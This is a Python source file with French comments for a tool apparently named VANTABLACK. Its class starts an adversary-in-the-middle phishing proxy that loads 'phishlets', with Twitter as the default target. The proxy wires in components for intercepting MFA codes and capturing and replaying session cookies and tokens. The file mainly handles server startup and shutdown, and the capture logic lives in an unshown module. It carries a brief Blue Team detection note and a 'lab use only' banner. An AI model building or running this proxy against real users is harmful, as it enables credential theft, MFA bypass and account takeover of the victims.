"""
core/proxy.py
-------------
Implémente la classe `AdvancedRedTeamProxy` attendue par la CLI
(`main.py` -> VantablackReloaded.start_proxy).

Cette classe est une **façade de haut niveau** au-dessus de l'application
FastAPI définie dans `engine/advanced_proxy.py` :
- Elle gère le cycle de vie (start/stop) avec un thread d'arrière-plan.
- Elle accepte un objet `Settings` (core/config.py) pour la configuration.
- Elle orchestre le moteur de phishlets avancé (AdvancedPhishletEngine)
  + la capture de sessions (SessionHijacker) + l'interception MFA
  (MFABypassEngine).

Usage (depuis la CLI) :
    from core.config import Settings
    from core.proxy import AdvancedRedTeamProxy

    settings = Settings()
    proxy = AdvancedRedTeamProxy(settings)
    proxy.start()        # bloque jusqu'à KeyboardInterrupt
    # ou
    proxy.start(block=False)  # lance en thread d'arrière-plan

Justification de la séparation core/ vs engine/ :
- `core/`  : API stable, façade publique, testable, dépendances minimales.
- `engine/` : implémentation technique, sujette à évolution rapide.

NOTE Pédagogique (Blue Team) :
    Le proxy AiTM (Adversary-in-the-Middle) se place entre la victime et
    le service légitime (ex: login.microsoftonline.com). Il relaie les
    requêtes en transmettant authentiquement le trafic tout en capturant
    cookies et tokens. La détection se fait via :
    - Certificat TLS inhabituel (JA3/JA4 fingerprinting)
    - Anomalies de résolution DNS (domaines typosquattés)
    - Comportement utilisateur post-connexion (géolocalisation IP)
"""

from __future__ import annotations

import logging
import os
import signal
import threading
from typing import Optional

import uvicorn

# Imports internes (ordre stable pour éviter les cycles)
from core.config import Settings
from engine.advanced_proxy import (
    AdvancedPhishletEngine,
    MFABypassEngine,
    SessionHijacker,
)
from engine.advanced_proxy import (
    app as advanced_app,
)

# Logger dédié : préfixe [ADV_PROXY] pour grep facile
logger = logging.getLogger("core.proxy")
if not logger.handlers:
    handler = logging.StreamHandler()
    handler.setFormatter(
        logging.Formatter("%(asctime)s [%(levelname)s] ADV_PROXY: %(message)s")
    )
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)


class AdvancedRedTeamProxy:
    """
    Façade publique du proxy AiTM VANTABLACK.

    Attributs :
        settings       : instance `Settings` (Pydantic) – configuration centralisée
        phishlet_path  : chemin YAML du phishlet à charger (env: PHISHLET_PATH)
        phishlet_engine: AdvancedPhishletEngine (moteur de rewriting + capture)
        mfa_engine     : MFABypassEngine (extraction de codes TOTP/SMS)
        session_hijacker : SessionHijacker (capture/replay de sessions)
        _server_thread : thread d'arrière-plan (uvicorn) ou None si en mode bloquant
        _is_running    : bool – état courant
    """

    def __init__(self, settings: Settings | None = None, phishlet_path: str | None = None):
        # Configuration : priorité (1) paramètre explicite, (2) env, (3) défaut
        self.settings: Settings = settings or Settings()

        # Résolution du phishlet : paramètre > variable d'env > défaut twitter.yaml
        self.phishlet_path: str = (
            phishlet_path
            or os.getenv("PHISHLET_PATH")
            or os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                "phishlets",
                "twitter.yaml",
            )
        )

        # Initialisation des sous-composants (réutilisation de engine/)
        self.phishlet_engine: AdvancedPhishletEngine | None = None
        self.mfa_engine: MFABypassEngine = MFABypassEngine()
        self.session_hijacker: SessionHijacker = SessionHijacker()

        # État interne
        self._server_thread: threading.Thread | None = None
        self._uvicorn_server: uvicorn.Server | None = None  # Référence pour arrêt gracieux
        self._is_running: bool = False
        self._shutdown_event: threading.Event = threading.Event()

        # Configuration de l'environnement pour uvicorn / phishlet
        os.environ.setdefault("PHISHLET_PATH", self.phishlet_path)

    # ------------------------------------------------------------------ #
    # API publique
    # ------------------------------------------------------------------ #

    def start(self, block: bool = True) -> None:
        """
        Démarre le serveur uvicorn.

        Args:
            block: Si True (défaut), bloque jusqu'à KeyboardInterrupt.
                   Si False, lance dans un thread d'arrière-plan.
        """
        if self._is_running:
            logger.warning("Le proxy est déjà en cours d'exécution.")
            return

        # Initialisation paresseuse du phishlet engine (peut être None si pas de YAML)
        if os.path.exists(self.phishlet_path):
            try:
                self.phishlet_engine = AdvancedPhishletEngine(self.phishlet_path)
                logger.info("✅ Phishlet chargé : %s", self.phishlet_path)
            except Exception as e:
                logger.error("❌ Échec de chargement du phishlet : %s", e)
                self.phishlet_engine = None
        else:
            logger.warning(
                "⚠️  Aucun phishlet trouvé à %s – le proxy tourne sans rewriting.",
                self.phishlet_path,
            )

        # Détermination de l'hôte/port
        host: str = getattr(self.settings, "proxy_host", "0.0.0.0")
        port: int = int(getattr(self.settings, "proxy_port", 8080))

        # Importer uvicorn ici (lazy) pour ne pas pénaliser l'import de la CLI
        import uvicorn

        if block:
            # Mode bloquant : clavier = arrêt propre
            self._is_running = True
            self._install_signal_handlers()
            logger.info("🚀 Démarrage du proxy en mode bloquant sur %s:%d", host, port)
            try:
                # On passe `advanced_app` (déjà instrumenté avec le middleware AiTM)
                uvicorn.run(
                    advanced_app,
                    host=host,
                    port=port,
                    log_level=os.getenv("PROXY_LOG_LEVEL", "info"),
                )
            except KeyboardInterrupt:
                logger.info("Arrêt demandé par l'utilisateur (Ctrl+C).")
            finally:
                self._is_running = False
        else:
            # Mode non bloquant : thread d'arrière-plan
            self._is_running = True
            self._shutdown_event.clear()
            self._server_thread = threading.Thread(
                target=self._serve_forever,
                args=(host, port),
                daemon=True,
                name="VantablackProxyThread",
            )
            self._server_thread.start()
            logger.info(
                "🚀 Proxy lancé en arrière-plan (thread %s) sur %s:%d",
                self._server_thread.name, host, port,
            )

    def stop(self) -> None:
        """
        Demande l'arrêt propre du serveur. Sans effet si déjà arrêté ou
        en mode bloquant (où seul Ctrl+C fonctionne).
        """
        if not self._is_running:
            logger.info("Le proxy n'est pas en cours d'exécution.")
            return

        logger.info("🛑 Demande d'arrêt du proxy…")
        self._shutdown_event.set()
        # Méthode 1 (préférée) : on demande à uvicorn de sortir proprement
        # via le drapeau `should_exit`. uvicorn terminera la boucle asyncio
        # et le thread pourra se joindre.
        if self._uvicorn_server is not None:
            try:
                self._uvicorn_server.should_exit = True
            except Exception as e:
                logger.warning("Impossible de notifier uvicorn : %s", e)
        # On laisse au thread le temps de finir (timeout généreux)
        if self._server_thread and self._server_thread.is_alive():
            self._server_thread.join(timeout=5.0)
        self._is_running = False
        self._uvicorn_server = None
        logger.info("✅ Proxy arrêté.")

    def is_running(self) -> bool:
        """Retourne l'état courant (thread-safe best-effort)."""
        return self._is_running

    # ------------------------------------------------------------------ #
    # Méthodes internes
    # ------------------------------------------------------------------ #

    def _serve_forever(self, host: str, port: int) -> None:
        """
        Cible du thread d'arrière-plan : exécute uvicorn jusqu'à
        ce que `self._shutdown_event` soit signalé.
        """
        from uvicorn import Config, Server

        config = Config(
            advanced_app,
            host=host,
            port=port,
            log_level=os.getenv("PROXY_LOG_LEVEL", "info"),
            lifespan="on",
        )
        server = Server(config=config)
        # On garde la référence pour permettre à stop() de demander l'arrêt
        self._uvicorn_server = server

        try:
            server.run()
        except Exception as e:
            logger.exception("Erreur fatale du serveur proxy : %s", e)
        finally:
            self._is_running = False
            self._uvicorn_server = None
            logger.info("Thread proxy terminé.")

    def _install_signal_handlers(self) -> None:
        """
        Installe des gestionnaires SIGINT/SIGTERM propres pour permettre
        un arrêt gracieux en mode bloquant. Idempotent.
        """

        def _handler(sig, frame):
            logger.info("Signal %s reçu – arrêt en cours…", sig)
            # Laisse uvicorn gérer le shutdown (raise KeyboardInterrupt)
            raise KeyboardInterrupt

        # On évite de réécraser les handlers de tests/CI
        try:
            signal.signal(signal.SIGINT, _handler)
            signal.signal(signal.SIGTERM, _handler)
        except ValueError:
            # Signal ne peut être installé que depuis le thread principal
            pass


# ---------------------------------------------------------------------- #
# Point d'entrée : permet `python -m core.proxy` pour un démarrage rapide
# ---------------------------------------------------------------------- #

if __name__ == "__main__":
    # Petit mode autonome pour debug : proxy sans CLI
    print("=" * 70)
    print(" VANTABLACK Advanced Proxy – mode autonome")
    print(" Phishlet :", os.getenv("PHISHLET_PATH", "(non défini)"))
    print(" ATTENTION : usage strictement encadré (labo autorisé).")
    print("=" * 70)
    AdvancedRedTeamProxy().start(block=True)
